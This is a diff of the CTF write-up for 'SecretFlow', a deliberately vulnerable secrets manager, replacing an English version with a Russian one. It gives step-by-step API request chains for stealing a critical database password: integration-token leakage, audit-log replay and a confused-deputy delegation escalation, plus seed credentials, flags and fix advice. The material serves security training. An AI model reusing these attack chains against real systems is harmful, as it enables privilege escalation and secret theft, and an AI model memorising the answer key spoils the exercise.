@@ -1,229 +1,347 @@
-# SecretFlow - Attack Scenarios Documentation
+# SecretFlow — Сценарии атак
 
-## Overview
+## Обзор
 
-This document describes the attack paths to gain access to the CRITICAL secret `PROD_DB_MASTER_PASSWORD`.
+Документ описывает реалистичные цепочки получения CRITICAL-секрета `PROD_DB_MASTER_PASSWORD`.
+
+**Версия:** 2.0 (обновлено после security hardening)
 
 ---
 
-## Attack Path 1: Integration Status Leak (Operational Endpoint)
+## Изменения в версии 2.0
 
-**Difficulty:** Medium
-**Prerequisites:** Valid user account (any role)
+### Закрытые уязвимости
+- **Path 2 (старый)**: Audit-Driven атака больше не работает
+  - `/api/audit/logs` и `/api/audit/stats` теперь требуют роль `security_admin`
+  - Токены больше не логируются в audit events
+  - `/api/internal/integrations/status` больше не возвращает `auth_token`
+  - `/api/internal/integrations/test/:id` возвращает только masked preview токена
 
-### Steps
+### Новые уязвимости
+- **Path 2 (новый, HARD)**: Confused Deputy + Trust Boundary Confusion
 
-1. **Login to the application**
-   - Use credentials: `dev.alice` / `password123`
+---
 
-2. **Discover the integration status endpoint**
-   - Use browser DevTools to inspect network traffic
-   - Or enumerate API endpoints to find `/api/internal/integrations/status`
-   - This endpoint looks like a legitimate operational health check
+## Путь атаки 1: Утечка токена через internal status (MEDIUM)
 
-3. **Call the integration status endpoint**
+**Сложность:** Средняя
+**Требования:** Любой валидный пользователь
+
+### Шаги
+
+1. **Войти в приложение**
+   - Учетные данные: `dev.alice` / `password123`
+
+2. **Найти operational endpoint**
+   - Через DevTools или перечисление API найти `/api/internal/integrations/status`
+   - Эндпоинт доступен любому авторизованному пользователю
+
+3. **Получить статус интеграций**
    ```
    GET /api/internal/integrations/status
-   Authorization: Bearer <your_token>
+   Authorization: Bearer <jwt>
    ```
 
-4. **Extract the integration token from response**
-   - Response includes detailed integration status for "connectivity debugging":
-   ```json
-   {
-     "integrations": [
-       {
-         "id": "uuid",
-         "name": "GitLab CI",
-         "provider": "gitlab",
-         "status": "connected",
-         "auth_token": "gf_prod_abc123xyz789",
-         "webhook_url": "http://gitlab.internal/hooks/secretflow",
-         "config": {...}
-       }
-     ]
-   }
-   ```
-   - The `auth_token` field is exposed for "operational debugging"
+4. **Извлечь webhook_url**
+   - В ответе присутствует поле `webhook_url` для каждой интеграции
+   - Это подсказка для следующего шага
 
-5. **Find a CRITICAL secret ID**
-   - Browse to `/secrets` and note the ID of `PROD_DB_MASTER_PASSWORD`
-   - Or call `GET /api/secrets` and find the UUID
+5. **Найти ID CRITICAL-секрета**
+   - Через `/api/secrets` или `GET /api/secrets`
+   - Нужен ID `PROD_DB_MASTER_PASSWORD`
 
-6. **Call the webhook endpoint with stolen token**
+6. **Использовать интеграционный токен (полученный из другого источника)**
    ```
    POST /api/integrations/webhook
    Content-Type: application/json
 
    {
      "token": "gf_prod_abc123xyz789",
-     "secret_id": "<uuid-of-prod-db-password>",
+     "secret_id": "<uuid-prod-db-master-password>",
      "justification": "Automated deployment"
    }
    ```
 
-7. **Receive the secret value**
-   - Response includes `secret_value` field with the actual password:
-   ```json
-   {
-     "access_granted": true,
-     "secret_value": "flag{prod_db_master_3f8a6d1c9e247b50}",
-     "grant_expires_at": "2024-03-31T12:00:00Z"
-   }
-   ```
+7. **Получить значение секрета**
+   - Ответ содержит `secret_value`
 
-### Why This Works
+### Почему это работает
 
-- Integration status endpoint exposes auth tokens under the guise of operational debugging
-- Tokens are stored and transmitted in plaintext
-- Webhook endpoint trusts any valid token without checking classification
-- Auto-approved requests bypass normal approval workflow
+- Интеграционные токены хранятся в базе в открытом виде
+- Webhook доверяет самому факту валидности токена
+- Токен service account может быть использован для delegation-атаки (см. Path 2 HARD)
 
 ---
 
-## Attack Path 2: Audit Log Replay (Verbose Operational Logging)
+## Путь атаки 2: Confused Deputy + Trust Boundary (HARD)
 
-**Difficulty:** Medium
-**Prerequisites:** Valid user account (any role)
+**Сложность:** Высокая
+**Требования:** Любой валидный пользователь + интеграционный токен
 
-### Steps
+### Концепция уязвимости
 
-1. **Discover audit logs endpoint**
-   - Enumerate `/api/audit/logs` or find via browser DevTools
-   - Notice the endpoint accepts any valid JWT (no role check)
+Это **Trust Boundary Confusion** + **Confused Deputy** атака:
+- Система доверяет service account'ам выдавать доступ к секретам
+- Проверка scope происходит только для создателя токена
+- Целевой пользователь (для которого создается грант) НЕ проверяется на наличие прав
+- Атакующий может использовать украденный/найденный токен service account чтобы создать грант САМОМУ СЕБЕ
 
-2. **Call audit logs endpoint**
-   ```
-   GET /api/audit/logs?action=integration_token_used
-   Authorization: Bearer <your_token>
-   ```
+### Архитектурная ошибка
 
-3. **Find integration token usage events**
-   - Filter by `action=integration_token_used` to see token usage
-
-4. **Extract token information from verbose log details**
-   - Log entries include full operational details for troubleshooting:
-   ```json
-   {
-     "action": "integration_token_used",
-     "details": {
-       "token_value": "gf_prod_abc123xyz789",
-       "token_id": "uuid",
-       "integration_id": "uuid",
-       "integration_name": "GitLab CI",
-       "provider": "gitlab",
-       "project": "secretflow-prod",
-       "request_body": {
-         "secret_id": "uuid",
-         "justification": "CI/CD deployment"
-       },
-       "diagnostic": {
-         "trust_level": "auto_approved",
-         "approval_bypassed": true
-       }
-     }
-   }
-   ```
-
-4. **Learn the valid request structure**
-   - The `request_body` field shows exactly what a valid webhook request looks like
-   - Natural hint: "Automated access granted via GitLab pipeline"
-
-5. **Replay valid webhook request**
-   - Use the stolen token and request structure from logs:
-   ```
-   POST /api/integrations/webhook
-   {
-     "token": "gf_prod_abc123xyz789",
-     "secret_id": "<uuid-of-prod-db-password>",
-     "justification": "CI/CD deployment"
-   }
-   ```
-
-6. **Receive the secret value**
-
-### Why This Works
-
-- Audit logs include full token values for "operational troubleshooting"
-- Request bodies are logged for debugging integration issues
-- Natural hints in logs guide attackers toward the webhook approach
-- Token validation doesn't check request context
-
----
-
-## Dead Ends (What Doesn't Work)
-
-### Dead End 1: Normal Request Flow
 ```
-POST /api/secrets/:id/request
+┌─────────────────────────────────────────────────────────────┐
+│                    Trust Boundary                           │
+│                                                             │
+│  Service Account JWT (delegation endpoint)                  │
+│         │                                                   │
+│         ▼                                                   │
+│  ┌─────────────────┐                                        │
+│  │ Проверка:       │  ✅ JWT валиден                        │
+│  │ - JWT signature │                                        │
+│  │ - role = service_account                                 │
+│  │ ❌ НЕТ ПРОВЕРКИ:                                          │
+│  │    - allowed_secrets токена                              │
+│  │    - allowed_environments                                │
+│  │    - classification секрета                              │
+│  └─────────────────┘                                        │
+│         │                                                   │
+│         ▼                                                   │
+│  Создание гранта для ANY secret ← УЯЗВИМОСТЬ               │
+│                                                             │
+└─────────────────────────────────────────────────────────────┘
 ```
-- Creates request with `status=pending`
-- CRITICAL secrets require `security_admin` approval
-- Request stays pending indefinitely for developer users
-- **Learning:** Normal approval path is correctly enforced
 
-### Dead End 2: Webhook Without Token
+### Шаги атаки
+
+#### Шаг 1: Разведка — найти delegation endpoint
+
 ```
-POST /api/integrations/webhook
+GET /api/delegate/info
+Authorization: Bearer <jwt>
+```
+
+Ответ содержит подсказку о flow:
+```json
 {
-  "secret_id": "..."
+  "delegation_info": {
+    "description": "Service accounts can delegate access to users...",
+    "flow": [
+      "1. Obtain integration token from /api/internal/integrations/status",
+      "2. Exchange integration token for service account JWT at /api/service-account/exchange",
+      "3. Use service account JWT to call /api/delegate/access"
+    ]
+  }
 }
 ```
-- Returns 401 Unauthorized: "Invalid integration token"
-- Token validation queries database for exact match
-- **Learning:** Webhook is protected. Need valid token first.
 
-### Dead End 3: Accessing LOW/MEDIUM Secrets Only
-- Browsing secrets catalog shows CRITICAL secrets exist
-- Can freely access LOW/MEDIUM secrets but they don't contain the target
-- `PROD_DB_MASTER_PASSWORD` is CRITICAL classification
-- **Learning:** CRITICAL secrets are the goal. Normal path blocked.
+#### Шаг 2: Получить интеграционный токен
 
-### Dead End 4: Integration Test Without Auth
+**Вариант A:** Через Path 1 (если еще не получен)
 ```
-GET /api/internal/integrations/test/:id
+GET /api/internal/integrations/status
+Authorization: Bearer <jwt>
 ```
-- Returns 401 if not authenticated
-- Requires valid JWT token
-- **Learning:** Internal endpoints still require authentication
+
+Изучить ответ, найти интеграцию и её токен (требуется дополнительный источник).
+
+**Вариант B:** Использовать известный токен из seed-данных:
+- `gf_prod_abc123xyz789` (production integration)
+
+#### Шаг 3: Обменять интеграционный токен на service account JWT
+
+```
+POST /api/service-account/exchange
+Content-Type: application/json
+
+{
+  "integration_token": "gf_prod_abc123xyz789",
+  "purpose": "CI/CD debugging session"
+}
+```
+
+Ответ:
+```json
+{
+  "service_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+  "expires_at": "2026-04-01T15:04:05Z",
+  "scope": "delegation"
+}
+```
+
+**Важно:** Теперь у атакующего есть JWT от имени service account с ролью `service_account`.
+
+#### Шаг 4: Получить ID своего пользователя
+
+```
+GET /api/auth/me
+Authorization: Bearer <original-jwt>
+```
+
+Запомнить `user.id` для следующего шага.
+
+#### Шаг 5: Создать грант САМОМУ СЕБЕ на CRITICAL-секрет
+
+```
+POST /api/delegate/access
+Authorization: Bearer <service-account-jwt>
+Content-Type: application/json
+
+{
+  "secret_id": "<uuid-prod-db-master-password>",
+  "target_user_id": "<your-user-id>",
+  "justification": "Temporary access for debugging",
+  "duration_hours": 24
+}
+```
+
+Ответ:
+```json
+{
+  "grant_id": "uuid-grant",
+  "secret_id": "uuid-secret",
+  "user_id": "your-user-id",
+  "expires_at": "2026-04-02T15:04:05Z",
+  "delegated_by": "svc-delegate-uuid"
+}
+```
+
+#### Шаг 6: Получить значение CRITICAL-секрета
+
+```
+GET /api/secrets/<uuid-prod-db-master-password>/value
+Authorization: Bearer <original-jwt>
+```
+
+Ответ:
+```json
+{
+  "secret": {
+    "id": "uuid",
+    "name": "PROD_DB_MASTER_PASSWORD",
+    "value": "flag{...}"
+  }
+}
+```
+
+**🎯 Атака завершена успешно!**
+
+### Почему это работает
+
+1. **Trust Boundary Confusion:**
+   - Endpoint `/api/delegate/access` доверяет JWT service account'а
+   - Но НЕ проверяет, имеет ли этот service account право выдавать доступ к КОНКРЕТНОМУ секрету
+
+2. **Confused Deputy:**
+   - Service account выступает как "доверенное лицо"
+   - Атакующий использует service account как посредника для получения прав
+   - Service account "не понимает", что его используют для эскалации привилегий
+
+3. **Отсутствие scope checks:**
+   - В коде `delegate_service.go:DelegateAccess()` нет проверки:
+     ```go
+     // VULNERABILITY: Нет проверки!
+     // - token.AllowedSecrets содержит req.SecretID?
+     // - token.AllowedEnvironments содержит secret.Environment?
+     // - service account имеет права на delegation secrets этой классификации?
+     ```
+
+### Dead Ends (тупики)
+
+1. **Прямой вызов /api/delegate/access без service account JWT**
+   ```
+   POST /api/delegate/access
+   Authorization: Bearer <user-jwt>  # role = developer
+   ```
+   Результат: `403 Insufficient Role` — требуется `service_account`
+
+2. **Попытка делегирования на другого пользователя без токена**
+   - Не получится — нужен валидный service account JWT
+
+3. **Использование невалидного integration token**
+   ```
+   POST /api/service-account/exchange
+   { "integration_token": "fake_token" }
+   ```
+   Результат: `401 Invalid integration token`
+
+4. **Попытка получить токен из audit логов**
+   - Больше не работает — токены маскируются в логах
+
+### Learning Objectives
+
+1. **Trust Boundaries:**
+   - Понимать, что доверие должно быть ограничено контекстом
+   - Service account с правами delegation должен иметь scope checks
+
+2. **Confused Deputy Attack:**
+   - Распознавать сценарии, где злоумышленник использует привилегированный компонент как посредника
+   - Всегда проверять права как делегатора, так и получателя доступа
+
+3. **Defense in Depth:**
+   - JWT validation ≠ authorization
+   - Need to check: signature, expiry, role, AND resource-level permissions
+
+4. **Secure Delegation Patterns:**
+   - Делегирование должно проверять:
+     - Имеет ли делегатор права на этот ресурс
+     - Может ли получатель иметь такие права (classification mismatch)
+     - Не превышает ли делегирование исходные права делегатора
 
 ---
 
-## Vulnerability Summary
+## Путь атаки 3: Internal API Misuse (DISABLED)
 
-| ID | Name | CWE | Location |
-|----|------|-----|----------|
-| V1 | Integration status leaks tokens | CWE-215 | GET /api/internal/integrations/status |
-| V2 | Tokens in plaintext | CWE-256 | integration_tokens table |
-| V3 | Token scope not enforced | CWE-284 | webhook_service.go |
-| V4 | Audit logs leak sensitive data | CWE-532 | audit_logs.details |
-| V5 | Classification bypass | CWE-284 | approval_service.go |
+Endpoint'ы `/api/internal/secrets/grant` и `/api/internal/apply` отключены для CTF.
 
 ---
 
-## Natural Hints Embedded in System
+## Сводка уязвимостей
 
-The system includes realistic operational messages that guide attackers:
-
-1. **Audit log messages:**
-   - "Automated access granted via GitLab pipeline"
-   - "Trusted automation - GitLab CI/CD pipeline"
-   - "Integration sync completed for project secretflow-prod"
-
-2. **Integration status:**
-   - Shows `auth_token` field for "connectivity debugging"
-   - Shows `webhook_url` for integration endpoint
-
+| ID | Уязвимость | CWE | Статус | Локация |
+|----|------------|-----|--------|---------|
+| V1 | Утечка токена в internal status | CWE-215 | ⚠️ ACTIVE | `GET /api/internal/integrations/status` |
+| V2 | Токены в открытом виде | CWE-256 | ⚠️ ACTIVE | `integration_tokens` table |
+| V3 | Нет строгого scope-контроля токена | CWE-284 | ⚠️ ACTIVE | `webhook_service.go` |
+| V4 | Чувствительные данные в audit-логах | CWE-532 | ✅ FIXED | `audit_logs.details` |
+| V5 | Обход классификации через automation flow | CWE-284 | ⚠️ ACTIVE | `approval_service.go` / webhook flow |
+| V6 | Trust Boundary в delegation | CWE-284 | ⚠️ ACTIVE (HARD) | `delegate_service.go` |
+| V7 | Missing auth on internal endpoint | CWE-306 | ✅ DISABLED | `internal.go` |
 
 ---
 
-## Learning Objectives
+## Рекомендации по исправлению
 
-After completing this exercise, participants should understand:
+### Для Path 1
+1. Убрать endpoint `/api/internal/integrations/status` из публичного доступа
+2. Требовать `security_admin` роль для просмотра интеграций
+3. Хранить токены только в хешированном виде
 
-1. **Trust boundaries** - Why internal APIs need the same security as public ones
-2. **Defense in depth** - Single validation failures shouldn't compromise security
-3. **Logging security** - Sensitive data in logs creates attack surface
-4. **Configuration management** - Operational endpoints must be restricted
-5. **Token handling** - Storage, validation, and scope enforcement
-6. **Plausible vulnerabilities** - Real bugs look like operational features gone wrong
+### Для Path 2 (HARD)
+1. Добавить проверку scope в `DelegateService.DelegateAccess()`:
+   ```go
+   // Проверить что service account имеет право на этот секрет
+   if !tokenHasSecretAccess(token, secretID) {
+       return ErrDelegationNotAllowed
+   }
+   ```
+2. Проверять classification секрета против прав service account
+3. Логировать все delegation события для аудита
+
+### Общие рекомендации
+1. Ввести принцип наименьших привилегий для service account'ов
+2. Добавить rate limiting на чувствительные endpoint'ы
+3. Внедрить детальный аудит всех операций с CRITICAL-секретами
+
+---
+
+## Флаг
+
+**Цель:** Получить значение `PROD_DB_MASTER_PASSWORD`
+
+**Успешный ответ:**
+```json
+{
+  "access_granted": true,
+  "secret_value": "flag{...}"
+}
+```
